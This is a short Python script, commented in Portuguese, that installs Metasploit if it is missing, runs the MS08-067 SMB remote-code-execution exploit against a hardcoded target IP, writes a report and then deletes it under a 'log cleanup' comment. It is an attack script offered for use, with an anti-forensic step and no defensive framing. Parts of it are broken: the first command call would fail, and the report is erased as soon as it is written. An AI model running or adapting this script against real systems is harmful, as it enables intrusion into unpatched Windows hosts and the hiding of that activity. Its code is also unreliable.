import subprocess

def install_exploit_tools():
    """Instala ferramentas de exploração necessárias, como Metasploit"""
    try:
        subprocess.run("msfconsole -v", check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    except subprocess.CalledProcessError:
        print("Metasploit não encontrado. Instalando...")
        try:
            subprocess.run("sudo apt-get install metasploit-framework -y", check=True, shell=True)
        except subprocess.CalledProcessError:
            print("Falha ao instalar Metasploit. Continuando sem a ferramenta.")
            return False
    return True

def exploit_target(target_ip):
    """Exploração de vulnerabilidades usando Metasploit"""
    install_exploit_tools()

    # Iniciar Metasploit
    print(f"Iniciando exploração no alvo {target_ip} com Metasploit...")
    msf_cmd = f"msfconsole -x 'use exploit/windows/smb/ms08_067_netapi; set RHOST {target_ip}; run'"
    subprocess.run(msf_cmd, shell=True)

    # Geração de relatório
    with open("exploit_report.txt", "w") as report:
        report.write(f"Exploitação realizada para o alvo {target_ip}.\n")

    print("Exploração finalizada. Relatório gerado: exploit_report.txt")

    # Limpeza de Logs
    subprocess.run("rm -f exploit_report.txt", shell=True)

# Exemplo de execução
target_ip = "192.168.1.1"
exploit_target(target_ip)
